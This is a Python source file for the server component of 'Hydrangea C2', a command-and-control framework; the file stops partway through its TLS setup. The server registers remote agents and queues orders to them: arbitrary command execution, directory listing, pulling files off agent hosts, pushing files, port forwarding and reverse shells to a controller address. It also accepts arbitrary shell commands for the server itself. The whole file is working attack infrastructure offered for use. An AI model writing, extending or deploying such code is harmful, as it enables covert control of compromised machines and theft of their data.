#!/usr/bin/env python3

import argparse
import asyncio
import hashlib
import json
import logging
import logging.handlers
import os
import shutil
import ssl
import subprocess
import time
import uuid
from typing import Any

__version__ = "4.0"

from .utils.common import ProtocolError, read_frame, safe_join, write_frame

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
file_handler = logging.FileHandler("hydrangea_server.log")
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s"))
logging.getLogger().addHandler(file_handler)
log = logging.getLogger("hydrangea.server")


# ── TLS helpers ───────────────────────────────────────────────────────────────


def _gen_self_signed_cert(cert_path: str, key_path: str) -> None:
    """Generate a self-signed cert + key via openssl (RSA-2048, 10-year validity)."""
    if not shutil.which("openssl"):
        raise RuntimeError(
            "openssl not found in PATH. "
            "Provide --tls-cert and --tls-key manually, or install openssl."
        )
    try:
        subprocess.run(
            [
                "openssl",
                "req",
                "-x509",
                "-newkey",
                "rsa:2048",
                "-nodes",
                "-keyout",
                key_path,
                "-out",
                cert_path,
                "-days",
                "3650",
                "-subj",
                "/CN=hydrangea-c2",
            ],
            check=True,
            capture_output=True,
        )
    except subprocess.CalledProcessError as exc:
        stderr = exc.stderr.decode(errors="replace").strip()
        raise RuntimeError(f"openssl failed to generate certificate: {stderr}") from exc
    log.info(f"Generated TLS certificate: {cert_path}  key: {key_path}")


def _cert_fingerprint(cert_path: str) -> str:
    """Return the hex SHA256 fingerprint of a PEM certificate (no colons)."""
    with open(cert_path) as fh:
        pem = fh.read()
    der = ssl.PEM_cert_to_DER_cert(pem)
    return hashlib.sha256(der).hexdigest()


def _make_ssl_context(cert_path: str, key_path: str) -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert_path, key_path)
    return ctx


class ClientSession:
    def __init__(self, client_id: str, writer: asyncio.StreamWriter, port: int, peer: str):
        self.client_id = client_id
        self.writer = writer
        self.port = port
        self.peer = peer
        self.user: str = "?"
        self.hostname: str = "?"
        self.queue: asyncio.Queue[dict] = asyncio.Queue(maxsize=256)
        self.alive = True
        self.last_seen: float = time.time()
        self.pump_task: asyncio.Task | None = None


class Server:
    def __init__(
        self,
        host: str,
        admin_port: int,
        agent_ports: list[int],
        storage: str,
        admin_token: str,
        agent_tokens: set,
        ssl_ctx: ssl.SSLContext | None = None,
    ):
        self.host = host
        self.admin_port = admin_port
        self.agent_ports: list[int] = list(agent_ports)
        # Ports present at startup — never removable at runtime.
        self.startup_agent_ports: frozenset[int] = frozenset(agent_ports)
        self.storage = storage
        self.admin_token = admin_token
        self.agent_tokens: set = set(agent_tokens)
        # Per-port exclusive token sets. When a port has an entry here, ONLY those
        # tokens are accepted on that port (global agent_tokens are bypassed).
        self.port_token_map: dict[int, set] = {}
        # Maps agent port number → asyncio.Server object for dynamic close.
        self.port_server_map: dict[int, asyncio.base_events.Server] = {}
        self.ssl_ctx = ssl_ctx
        os.makedirs(self.storage, exist_ok=True)
        self.clients: dict[str, ClientSession] = {}
        self.servers: list[asyncio.base_events.Server] = []
        self.pending: dict[str, asyncio.Future] = {}
        # Maps client_id -> set of req_ids currently waiting for that client.
        # Used to cancel futures immediately when the client disconnects.
        self.client_futures: dict[str, set[str]] = {}
        self.log_buffer = logging.handlers.MemoryHandler(capacity=100, target=None)
        logging.getLogger().addHandler(self.log_buffer)

    async def start(self):
        agent_ports_str = ", ".join(f":{p}" for p in self.agent_ports)
        log.info(
            f"Starting on {self.host}  admin=:{self.admin_port}"
            f"  agents={agent_ports_str}  storage={self.storage}"
        )

        def _make_admin_handler(p: int):
            async def _h(r: asyncio.StreamReader, w: asyncio.StreamWriter):
                await self.handle_admin_port(r, w, p)

            return _h

        def _make_agent_handler(p: int):
            async def _h(r: asyncio.StreamReader, w: asyncio.StreamWriter):
                await self.handle_agent_port(r, w, p)

            return _h

        srv = await asyncio.start_server(
            _make_admin_handler(self.admin_port), self.host, self.admin_port, ssl=self.ssl_ctx
        )
        self.servers.append(srv)
        log.info(f"Admin port listening on :{self.admin_port}")

        for port in self.agent_ports:
            srv = await asyncio.start_server(
                _make_agent_handler(port), self.host, port, ssl=self.ssl_ctx
            )
            self.servers.append(srv)
            self.port_server_map[port] = srv
            log.info(f"Agent port listening on :{port}")

        asyncio.create_task(self._keepalive_loop())
        await asyncio.gather(*(srv.serve_forever() for srv in self.servers))

    async def handle_admin_port(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, port: int
    ):
        peer = writer.get_extra_info("peername")
        try:
            header, payload = await read_frame(reader)
        except Exception as e:
            log.warning(f":{port} (admin) {peer} failed initial frame: {e}")
            writer.close()
            await writer.wait_closed()
            return

        if header.get("token") != self.admin_token:
            log.warning(f":{port} (admin) auth failed from {peer}")
            await write_frame(writer, {"type": "ERROR", "error": "auth_failed"})
            writer.close()
            await writer.wait_closed()
            return

        if header.get("type") != "ADMIN":
            log.warning(
                f":{port} (admin) rejected type={header.get('type')!r} from {peer} — use an agent port"
            )
            await write_frame(writer, {"type": "ERROR", "error": "wrong_port"})
            writer.close()
            await writer.wait_closed()
            return

        log.info(f":{port} (admin) {peer}  action={header.get('action')}")
        await self.handle_admin(reader, writer, header, payload)

    async def handle_agent_port(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, port: int
    ):
        peer = writer.get_extra_info("peername")
        try:
            header, payload = await read_frame(reader)
        except Exception as e:
            log.warning(f":{port} (agent) {peer} failed initial frame: {e}")
            writer.close()
            await writer.wait_closed()
            return

        port_exclusive = self.port_token_map.get(port)
        allowed = port_exclusive if port_exclusive is not None else self.agent_tokens
        if header.get("token") not in allowed:
            log.warning(f":{port} (agent) auth failed from {peer}")
            await write_frame(writer, {"type": "ERROR", "error": "auth_failed"})
            writer.close()
            await writer.wait_closed()
            return

        if header.get("type") != "REGISTER":
            log.warning(
                f":{port} (agent) rejected type={header.get('type')!r} from {peer} — use the admin port"
            )
            await write_frame(writer, {"type": "ERROR", "error": "wrong_port"})
            writer.close()
            await writer.wait_closed()
            return

        await self.handle_client(reader, writer, header, port)

    async def handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        header: dict[str, Any],
        port: int,
    ):
        peer = writer.get_extra_info("peername")
        client_id = header.get("client_id")
        if not client_id:
            await write_frame(writer, {"type": "ERROR", "error": "missing_client_id"})
            writer.close()
            await writer.wait_closed()
            return

        # Handle test connections separately
        if client_id.startswith("test-connection"):
            await write_frame(writer, {"type": "REGISTERED", "server_version": __version__})
            log.info(f":{port} test connection: {client_id} from {peer}")
            writer.close()
            await writer.wait_closed()
            return

        # Replace existing session if duplicate
        if client_id in self.clients:
            log.info(f":{port} replacing existing session for {client_id}")
            try:
                self.clients[client_id].writer.close()
            except Exception:
                pass

        peer_str = f"{peer[0]}:{peer[1]}" if peer else "unknown"
        session = ClientSession(client_id, writer, port, peer_str)
        self.clients[client_id] = session
        await write_frame(writer, {"type": "REGISTERED", "server_version": __version__})
        log.info(f":{port} client registered: {client_id} from {peer_str}")

        # Start a task to pump orders to client; store ref for clean cancellation
        session.pump_task = asyncio.create_task(self._pump_orders(session))

        # Automatically request SESSION_INFO after registration so user/hostname
        # are populated in the clients list without requiring a manual 'session' call.
        async def _auto_session():
            await asyncio.sleep(0.5)
            if self.clients.get(client_id) is not session:
                return
            req_id = uuid.uuid4().hex
            fut: asyncio.Future = asyncio.get_running_loop().create_future()
            self.pending[req_id] = fut
            self.client_futures.setdefault(client_id, set()).add(req_id)
            await session.queue.put({"header": {"type": "SESSION_INFO", "req_id": req_id}})
            try:
                _, res_payload = await asyncio.wait_for(fut, timeout=10.0)
                info = json.loads(res_payload.decode()) if res_payload else {}
                session.user = info.get("user", "?")
                session.hostname = info.get("hostname", "?")
            except Exception:
                pass
            finally:
                self.pending.pop(req_id, None)

        asyncio.create_task(_auto_session())

        try:
            while not reader.at_eof():
                header, payload = await read_frame(reader)
                session.last_seen = time.time()
                t = header.get("type")
                if t == "PONG":
                    rid = header.get("req_id")
                    if self._resolve_pending_result(header, payload):
                        log.debug(f"[{client_id}] PONG req_id={rid}")
                    else:
                        log.debug(f"[{client_id}] PONG (keepalive)")

                elif t == "RESULT_LIST_DIR":
                    path = header.get("path", "?")
                    count = header.get("entries_count", "?")
                    self._resolve_pending_result(header, payload)
                    log.info(f"[{client_id}] LIST_DIR {path!r}  {count} entries")

                elif t == "RESULT_EXEC":
                    try:
                        _r = json.loads(payload.decode()) if payload else {}
                    except Exception:
                        _r = {}
                    rc = _r.get("rc", header.get("rc"))
                    out_b = len((_r.get("stdout") or "").encode())
                    err_b = len((_r.get("stderr") or "").encode())
                    self._resolve_pending_result(header, payload)
                    log.info(f"[{client_id}] EXEC rc={rc}  stdout={out_b}B  stderr={err_b}B")

                elif t == "RESULT_SESSION_INFO":
                    try:
                        _i = json.loads(payload.decode()) if payload else {}
                    except Exception:
                        _i = {}
                    session.user = _i.get("user", session.user)
                    session.hostname = _i.get("hostname", session.hostname)
                    self._resolve_pending_result(header, payload)
                    log.info(
                        f"[{client_id}] SESSION_INFO"
                        f"  hostname={session.hostname!r}"
                        f"  user={session.user!r}"
                        f"  system={_i.get('system', '?')!r}"
                    )

                elif t == "FILE":
                    # Client sent a file in response to PULL_FILE
                    try:
                        rel = header.get("save_as") or os.path.basename(
                            header.get("src_path", "file.bin")
                        )

                        if rel and os.path.isabs(rel):
                            # Absolute save path: respect it (write anywhere on server)
                            dest_path = os.path.realpath(rel)
                            os.makedirs(os.path.dirname(dest_path) or "/", exist_ok=True)
                        else:
                            # Relative: keep it under server_storage/<client_id>/
                            dest_dir = os.path.join(self.storage, client_id)
                            os.makedirs(dest_dir, exist_ok=True)
                            dest_path = safe_join(dest_dir, rel or "file.bin")
                            os.makedirs(os.path.dirname(dest_path) or dest_dir, exist_ok=True)

                        with open(dest_path, "wb") as f:
                            f.write(payload or b"")

                        log.info(
                            f"[{client_id}] Received file -> {dest_path} "
                            f"({len(payload or b'')} bytes, sha256={header.get('sha256')})"
                        )
                        await write_frame(writer, {"type": "ACK", "ack": "FILE", "save_as": rel})
                    except Exception as e:
                        # Do not drop the client session; just log the error.
                        log.exception(f"[{client_id}] Failed saving incoming FILE: {e}")

                elif t == "LOG":
                    log.info(f"[{client_id}] {header.get('message')}")

                elif t == "REVERSE_SHELL":
                    controller_addr = header.get("controller_addr")
                    if not controller_addr:
                        response = {
                            "type": "ERROR",
                            "message": "Controller address missing",
                        }
                        await write_frame(writer, response, b"")
                        continue

                    response = {
                        "type": "REVERSE_SHELL",
                        "controller_addr": controller_addr,
                    }
                    await write_frame(writer, response, b"")

                else:
                    log.debug(f"[{client_id}] Unhandled message type: {t}")
        except (ProtocolError, asyncio.IncompleteReadError) as e:
            log.warning(f"[{client_id}] disconnected from {peer}: {e}")
        except Exception as e:
            log.exception(f"[{client_id}] error from {peer}: {e}")
        finally:
            # Cancel the pump task so it doesn't linger after disconnect
            if session.pump_task and not session.pump_task.done():
                session.pump_task.cancel()
            # Immediately cancel any admin futures waiting for this client
            # so callers get CancelledError instead of waiting for full timeout
            for rid in self.client_futures.pop(client_id, set()):
                fut = self.pending.pop(rid, None)
                if fut and not fut.done():
                    fut.cancel()
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            if self.clients.get(client_id) is session:
                del self.clients[client_id]
            log.info(f"[{client_id}] session closed (was {peer})")

    def _resolve_pending_result(self, header: dict, payload: bytes) -> bool:
        """Resolve a pending future with the result. Returns True if claimed."""
        rid = header.get("req_id")
        if rid and rid in self.pending:
            fut = self.pending.pop(rid)
            if not fut.done():
                fut.set_result((header, payload))
            return True
        return False

    async def _pump_orders(self, session: ClientSession):
        try:
            while session.alive:
                try:
                    order = await session.queue.get()
                    await write_frame(session.writer, order["header"], order.get("payload", b""))
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    log.warning(f"Failed to send order to {session.client_id}: {e}")
                    break
        except asyncio.CancelledError:
            pass
        finally:
            session.alive = False

    async def _keepalive_loop(self, interval: int = 30, dead_after: int = 90):
        """Ping all clients every `interval` seconds; evict those silent for `dead_after` seconds."""
        while True:
            await asyncio.sleep(interval)
            now = time.time()
            # Identify stale clients before iterating further
            dead = [
                cid for cid, sess in list(self.clients.items()) if now - sess.last_seen > dead_after
            ]
            for cid in dead:
                sess = self.clients.get(cid)
                if sess:
                    log.warning(
                        f"Keepalive: evicting stale client {cid} "
                        f"(last seen {int(now - sess.last_seen)}s ago)"
                    )
                    sess.alive = False
                    try:
                        sess.writer.close()
                    except Exception:
                        pass
            # Ping all remaining live clients
            for sess in list(self.clients.values()):
                try:
                    await sess.queue.put({"header": {"type": "PING"}})
                except Exception:
                    pass

    def get_health_status(self):
        """Generate the server's health status."""
        log_entries = []
        for record in self.log_buffer.buffer:
            log_entries.append(self.log_buffer.format(record))

        return {
            "status": "running",
            "connected_agents": len(self.clients),
            "recent_logs": log_entries[-10:],  # Last 10 log entries
        }

    async def handle_admin(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        header: dict[str, Any],
        payload: bytes,
    ):
        action = header.get("action")
        target = header.get("target_id")
        if action not in {
            "list",
            "pull",
            "push",
            "ping",
            "clients",
            "exec",
            "session_info",
            "health_status",
            "reverse_shell",
            "port_forward",
            "server_exec",
            "add_agent_token",
            "add_agent_port",
            "remove_agent_token",
            "remove_agent_port",
            "server_config",
        }:
            await write_frame(writer, {"type": "ERROR", "error": "unknown_admin_action"})
            writer.close()
            await writer.wait_closed()
            return

        if action == "clients":
            await write_frame(
                writer,
                {
                    "type": "CLIENTS",
                    "clients": [
                        {
                            "id": s.client_id,
                            "port": s.port,
                            "peer": s.peer,
                            "user": s.user,
                            "hostname": s.hostname,
                        }
                        for s in self.clients.values()
                    ],
                },
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "ping":
            if not target or target not in self.clients:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
                writer.close()
                await writer.wait_closed()
                return
            session = self.clients[target]
            timeout = float(header.get("timeout", 5.0))
            req_id = uuid.uuid4().hex
            fut: asyncio.Future = asyncio.get_running_loop().create_future()
            self.pending[req_id] = fut
            self.client_futures.setdefault(target, set()).add(req_id)
            await session.queue.put({"header": {"type": "PING", "req_id": req_id}})
            t_start = time.monotonic()
            try:
                await asyncio.wait_for(fut, timeout=timeout)
                rtt_ms = int((time.monotonic() - t_start) * 1000)
                await write_frame(writer, {"type": "PONG", "client_id": target, "rtt_ms": rtt_ms})
            except asyncio.TimeoutError:
                await write_frame(writer, {"type": "ERROR", "error": "timeout"})
            finally:
                self.pending.pop(req_id, None)
            writer.close()
            await writer.wait_closed()
            return

        if action == "health_status":
            health_status = self.get_health_status()
            await write_frame(writer, {"type": "HEALTH_STATUS", **health_status})
            writer.close()
            await writer.wait_closed()
            return

        if action == "server_exec":
            cmd = header.get("cmd")
            if not cmd:
                await write_frame(writer, {"type": "ERROR", "error": "missing_cmd"})
                writer.close()
                await writer.wait_closed()
                return
            timeout = float(header.get("timeout", 30.0))
            log.info(f"server_exec cmd={cmd!r}")
            try:
                proc = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                try:
                    stdout_b, stderr_b = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                except asyncio.TimeoutError:
                    try:
                        proc.kill()
                        await proc.communicate()
                    except Exception:
                        pass
                    await write_frame(writer, {"type": "ERROR", "error": "timeout"})
                    writer.close()
                    await writer.wait_closed()
                    return
                rc = proc.returncode
                log.info(f"server_exec rc={rc}  stdout={len(stdout_b)}B  stderr={len(stderr_b)}B")
                result = {
                    "rc": rc,
                    "stdout": stdout_b.decode(errors="replace"),
                    "stderr": stderr_b.decode(errors="replace"),
                }
                await write_frame(
                    writer,
                    {"type": "RESULT_EXEC", "rc": rc},
                    json.dumps(result).encode(),
                )
            except Exception as exc:
                log.exception(f"server_exec failed: {exc}")
                await write_frame(writer, {"type": "ERROR", "error": str(exc)})
            writer.close()
            await writer.wait_closed()
            return

        if action == "add_agent_token":
            token = header.get("agent_token")
            if not token:
                await write_frame(writer, {"type": "ERROR", "error": "missing_token"})
                writer.close()
                await writer.wait_closed()
                return
            bind_port = header.get("port")
            if bind_port is not None:
                bind_port = int(bind_port)
                if bind_port not in self.agent_ports:
                    await write_frame(writer, {"type": "ERROR", "error": "unknown_agent_port"})
                    writer.close()
                    await writer.wait_closed()
                    return
                if bind_port not in self.port_token_map:
                    self.port_token_map[bind_port] = set()
                self.port_token_map[bind_port].add(token)
                log.info(f"Token added to :{bind_port} exclusive set")
                await write_frame(writer, {"type": "OK", "scope": "port", "port": bind_port})
            else:
                self.agent_tokens.add(token)
                log.info("Token added to global agent token set")
                await write_frame(writer, {"type": "OK", "scope": "global"})
            writer.close()
            await writer.wait_closed()
            return

        if action == "add_agent_port":
            new_port = header.get("port")
            if not new_port:
                await write_frame(writer, {"type": "ERROR", "error": "missing_port"})
                writer.close()
                await writer.wait_closed()
                return
            new_port = int(new_port)
            if new_port == self.admin_port or new_port in self.agent_ports:
                await write_frame(writer, {"type": "ERROR", "error": "port_already_configured"})
                writer.close()
                await writer.wait_closed()
                return
            bind_token = header.get("agent_token")
            try:

                def _make_dyn_handler(p: int):
                    async def _h(r: asyncio.StreamReader, w: asyncio.StreamWriter):
                        await self.handle_agent_port(r, w, p)

                    return _h

                srv = await asyncio.start_server(
                    _make_dyn_handler(new_port), self.host, new_port, ssl=self.ssl_ctx
                )
                self.servers.append(srv)
                self.port_server_map[new_port] = srv
                asyncio.create_task(srv.serve_forever())
                self.agent_ports.append(new_port)
                if bind_token:
                    self.port_token_map[new_port] = {bind_token}
                    binding = "exclusive"
                    log.info(f"Agent port :{new_port} opened (exclusive token binding)")
                else:
                    binding = "global"
                    log.info(f"Agent port :{new_port} opened (global tokens)")
                await write_frame(
                    writer,
                    {
                        "type": "OK",
                        "port": new_port,
                        "token_binding": binding,
                    },
                )
            except OSError as exc:
                log.warning(f"Failed to open agent port :{new_port}: {exc}")
                await write_frame(writer, {"type": "ERROR", "error": str(exc)})
            writer.close()
            await writer.wait_closed()
            return

        if action == "remove_agent_token":
            token = header.get("agent_token")
            if not token:
                await write_frame(writer, {"type": "ERROR", "error": "missing_token"})
                writer.close()
                await writer.wait_closed()
                return
            rm_port = header.get("port")
            if rm_port is not None:
                rm_port = int(rm_port)
                if rm_port not in self.agent_ports:
                    await write_frame(writer, {"type": "ERROR", "error": "unknown_agent_port"})
                    writer.close()
                    await writer.wait_closed()
                    return
                port_set = self.port_token_map.get(rm_port)
                if port_set is None or token not in port_set:
                    await write_frame(writer, {"type": "ERROR", "error": "token_not_found"})
                    writer.close()
                    await writer.wait_closed()
                    return
                port_set.discard(token)
                if not port_set:
                    del self.port_token_map[rm_port]
                    log.info(f"Token removed from :{rm_port} exclusive set (now uses global tokens)")
                else:
                    log.info(f"Token removed from :{rm_port} exclusive set")
                await write_frame(writer, {"type": "OK", "scope": "port", "port": rm_port})
            else:
                if token not in self.agent_tokens:
                    await write_frame(writer, {"type": "ERROR", "error": "token_not_found"})
                    writer.close()
                    await writer.wait_closed()
                    return
                self.agent_tokens.discard(token)
                log.info("Token removed from global agent token set")
                await write_frame(writer, {"type": "OK", "scope": "global"})
            writer.close()
            await writer.wait_closed()
            return

        if action == "remove_agent_port":
            rm_port = header.get("port")
            if not rm_port:
                await write_frame(writer, {"type": "ERROR", "error": "missing_port"})
                writer.close()
                await writer.wait_closed()
                return
            rm_port = int(rm_port)
            if rm_port == self.admin_port:
                log.warning(f"Rejected attempt to close admin port :{self.admin_port}")
                await write_frame(writer, {"type": "ERROR", "error": "cannot_remove_admin_port"})
                writer.close()
                await writer.wait_closed()
                return
            if rm_port in self.startup_agent_ports:
                log.warning(f"Rejected attempt to close startup agent port :{rm_port}")
                await write_frame(writer, {"type": "ERROR", "error": "cannot_remove_startup_port"})
                writer.close()
                await writer.wait_closed()
                return
            if rm_port not in self.agent_ports:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_agent_port"})
                writer.close()
                await writer.wait_closed()
                return
            evicted: list[str] = []
            for cid, sess in list(self.clients.items()):
                if sess.port == rm_port:
                    evicted.append(cid)
                    sess.alive = False
                    try:
                        sess.writer.close()
                    except Exception:
                        pass
            srv = self.port_server_map.pop(rm_port, None)
            if srv:
                srv.close()
            self.agent_ports.remove(rm_port)
            self.port_token_map.pop(rm_port, None)
            log.info(f"Agent port :{rm_port} closed (evicted {len(evicted)} client(s))")
            await write_frame(writer, {
                "type": "OK",
                "port": rm_port,
                "evicted_clients": evicted,
            })
            writer.close()
            await writer.wait_closed()
            return

        if action == "server_config":

            def _mask(t: str) -> str:
                return t[:3] + "***" if len(t) > 3 else "***"

            config = {
                "type": "SERVER_CONFIG",
                "admin_port": self.admin_port,
                "agent_ports": self.agent_ports,
                "startup_agent_ports": sorted(self.startup_agent_ports),
                "global_tokens": sorted(_mask(t) for t in self.agent_tokens),
                "port_bindings": {
                    str(p): sorted(_mask(t) for t in tokens)
                    for p, tokens in self.port_token_map.items()
                },
            }
            await write_frame(writer, config)
            writer.close()
            await writer.wait_closed()
            return

        # actions below need a valid target
        if not target or target not in self.clients:
            await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
            writer.close()
            await writer.wait_closed()
            return

        session = self.clients[target]

        if action == "list":
            path = header.get("path", ".")
            wait = bool(header.get("wait", False))
            timeout = float(header.get("timeout", 10.0))

            if wait:
                req_id = uuid.uuid4().hex
                fut: asyncio.Future = asyncio.get_running_loop().create_future()
                self.pending[req_id] = fut
                self.client_futures.setdefault(target, set()).add(req_id)
                order = {"header": {"type": "LIST_DIR", "path": path, "req_id": req_id}}
                await session.queue.put(order)
                try:
                    res_header, res_payload = await asyncio.wait_for(fut, timeout=timeout)
                    await write_frame(writer, res_header, res_payload)
                except asyncio.TimeoutError:
                    await write_frame(writer, {"type": "ERROR", "error": "timeout", "path": path})
                finally:
                    self.pending.pop(req_id, None)
                writer.close()
                await writer.wait_closed()
                return
            else:
                order = {"header": {"type": "LIST_DIR", "path": path}}
                await session.queue.put(order)
                await write_frame(writer, {"type": "QUEUED", "order": "list", "path": path})
                writer.close()
                await writer.wait_closed()
                return

        if action == "pull":
            # Ask client to send us a file
            src = header.get("src")
            save_as = header.get("dest") or os.path.basename(src or "")
            if not src:
                await write_frame(writer, {"type": "ERROR", "error": "missing_src"})
                writer.close()
                await writer.wait_closed()
                return
            order = {"header": {"type": "PULL_FILE", "src_path": src, "save_as": save_as}}
            await session.queue.put(order)
            await write_frame(
                writer,
                {"type": "QUEUED", "order": "pull", "src": src, "save_as": save_as},
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "push":
            # Send a file to client. Payload contains the file bytes.
            dest = header.get("dest")
            src_name = header.get("src_name")
            if dest is None:
                await write_frame(writer, {"type": "ERROR", "error": "missing_dest_or_payload"})
                writer.close()
                await writer.wait_closed()
                return
            order = {
                "header": {
                    "type": "PUSH_FILE",
                    "dest_path": dest,
                    "src_name": src_name or "server_upload.bin",
                },
                "payload": payload or b"",
            }
            await session.queue.put(order)
            await write_frame(
                writer,
                {
                    "type": "QUEUED",
                    "order": "push",
                    "dest": dest,
                    "bytes": len(payload or b""),
                },
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "exec":
            cmd = header.get("cmd")
            if not cmd:
                await write_frame(writer, {"type": "ERROR", "error": "missing_cmd"})
                writer.close()
                await writer.wait_closed()
                return
            shell = bool(header.get("shell", False))
            cwd = header.get("cwd")
            timeout = float(header.get("timeout", 30.0))
            req_id = uuid.uuid4().hex
            fut: asyncio.Future = asyncio.get_running_loop().create_future()
            self.pending[req_id] = fut
            self.client_futures.setdefault(target, set()).add(req_id)
            order = {
                "header": {
                    "type": "EXEC",
                    "cmd": cmd,
                    "shell": shell,
                    "cwd": cwd,
                    "req_id": req_id,
                    "timeout": timeout,
                }
            }
            await session.queue.put(order)
            try:
                res_header, res_payload = await asyncio.wait_for(fut, timeout=timeout + 1.0)
                await write_frame(writer, res_header, res_payload)
            except asyncio.TimeoutError:
                await write_frame(writer, {"type": "ERROR", "error": "timeout"})
            finally:
                self.pending.pop(req_id, None)
            writer.close()
            await writer.wait_closed()
            return

        if action == "session_info":
            req_id = uuid.uuid4().hex
            fut: asyncio.Future = asyncio.get_running_loop().create_future()
            self.pending[req_id] = fut
            self.client_futures.setdefault(target, set()).add(req_id)
            order = {"header": {"type": "SESSION_INFO", "req_id": req_id}}
            await session.queue.put(order)
            try:
                res_header, res_payload = await asyncio.wait_for(
                    fut, timeout=float(header.get("timeout", 5.0))
                )
                await write_frame(writer, res_header, res_payload)
            except asyncio.TimeoutError:
                await write_frame(writer, {"type": "ERROR", "error": "timeout"})
            finally:
                self.pending.pop(req_id, None)
            writer.close()
            await writer.wait_closed()
            return

        if action == "port_forward":
            filename = header.get("filename")
            connect_args = header.get("connect_args")
            if not target or target not in self.clients:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
                writer.close()
                await writer.wait_closed()
                return
            session = self.clients[target]
            order = {
                "header": {
                    "type": "PORT_FORWARD",
                    "filename": filename,
                    "connect_args": connect_args,
                }
            }
            await session.queue.put(order)
            await write_frame(
                writer,
                {"type": "QUEUED", "order": "port_forward", "filename": filename},
            )
            writer.close()
            await writer.wait_closed()
            return

        if action == "reverse_shell":
            controller_addr = header.get("controller_addr")
            if not controller_addr:
                await write_frame(writer, {"type": "ERROR", "error": "missing_controller_addr"})
                writer.close()
                await writer.wait_closed()
                return
            if not target or target not in self.clients:
                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
                writer.close()
                await writer.wait_closed()
                return
            session = self.clients[target]
            order = {"header": {"type": "REVERSE_SHELL", "controller_addr": controller_addr}}
            await session.queue.put(order)
            await write_frame(
                writer,
                {
                    "type": "QUEUED",
                    "order": "reverse_shell",
                    "controller_addr": controller_addr,
                },
            )
            writer.close()
            await writer.wait_closed()
            return


art = r"""

   ▄█    █▄    ▄██   ▄   ████████▄     ▄████████    ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄████████         ▄████████    ▄████████    ▄████████  ▄█    █▄     ▄████████    ▄████████ 
  ███    ███   ███   ██▄ ███   ▀███   ███    ███   ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███    ███        ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    ███   ███▄▄▄███ ███    ███   ███    ███   ███    ███ ███   ███   ███    █▀    ███    █▀    ███    ███        ███    █▀    ███    █▀    ███    ███ ███    ███   ███    █▀    ███    ███ 
 ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███  ▄███         ▄███▄▄▄       ███    ███        ███         ▄███▄▄▄      ▄███▄▄▄▄██▀ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀▀███▀  ▄██   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███ ▀▀███ ████▄  ▀▀███▀▀▀     ▀███████████      ▀███████████ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███    ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███   ███   ███    ███   ███    █▄    ███    ███               ███   ███    █▄  ▀███████████ ███    ███   ███    █▄  ▀███████████ 
  ███    ███   ███   ███ ███   ▄███   ███    ███   ███    ███ ███   ███   ███    ███   ███    ███   ███    ███         ▄█    ███   ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀        ▄████████▀    ██████████   ███    ███  ▀██████▀    ██████████   ███    ███ 
                                      ███    ███                                                                                                ███    ███                           ███    ███ 

              Hydrangea C2  •  Server
"""


async def amain():
    ap = argparse.ArgumentParser(description="Hydrangea server")
    ap.add_argument("--host", default="0.0.0.0", help="Bind address")
    ap.add_argument(
        "--admin-port",
        type=int,
        required=True,
        help="Port for controller (admin) connections",
    )
    ap.add_argument(
        "--ports",
        nargs="+",
        type=int,
        required=True,
        help="Port(s) for agent connections (space-separated)",
    )
    ap.add_argument(
        "--storage",
        default="./server_storage",
        help="Directory to store incoming files",
    )
    ap.add_argument(
        "--admin-token",
        required=True,
        help="Auth token for controller connections",
    )
    ap.add_argument(
        "--agent-token",
        action="append",
        dest="agent_tokens",
        metavar="TOKEN",
        default=[],
        help="Allowed auth token for agent connections (repeatable); omit to configure at runtime",
    )
    ap.add_argument("--tls-cert", default=None, metavar="PEM", help="TLS certificate file")
    ap.add_argument("--tls-key", default=None, metavar="PEM", help="TLS private key file")
    ap.add_argument(
        "--tls-auto",
        action="store_true",
        help="Auto-generate a self-signed TLS cert (requires openssl in PATH)",
    )

    args = ap.parse_args()

    # ── TLS setup ─────────────────────────────────────────────────────────────
    ssl_ctx: ssl.SSLContext | None = None
    tls_fingerprint: str | None = None

    if args.tls_auto or (args.tls_cert and args.tls_key):
        cert_path = args.tls_cert or "hydrangea.crt"
        key_path = args.tls_key or "hydrangea.key"
        try:
            if args.tls_auto and (not os.path.exists(cert_path) or not os.path.exists(key_path)):
                _gen_self_signed_cert(cert_path, key_path)
            ssl_ctx = _make_ssl_context(cert_path, key_path)
            tls_fingerprint = _cert_fingerprint(cert_path)
        except RuntimeError as exc:
            print(f"\n  [error] {exc}\n")
            raise SystemExit(1) from exc
        except (ssl.SSLError, OSError) as exc:
            print(f"\n  [error] TLS setup failed: {exc}\n")
